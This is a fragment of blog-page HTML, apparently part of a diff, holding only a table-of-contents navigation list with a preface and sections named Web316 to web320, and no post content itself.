+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web316"><span class="nav-number">2.</span> <span class="nav-text">Web316</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web317"><span class="nav-number">3.</span> <span class="nav-text">Web317</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web318"><span class="nav-number">4.</span> <span class="nav-text">Web318</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web319"><span class="nav-number">5.</span> <span class="nav-text">web319</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web320"><span class="nav-number">6.</span> <span class="nav-text">web320</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
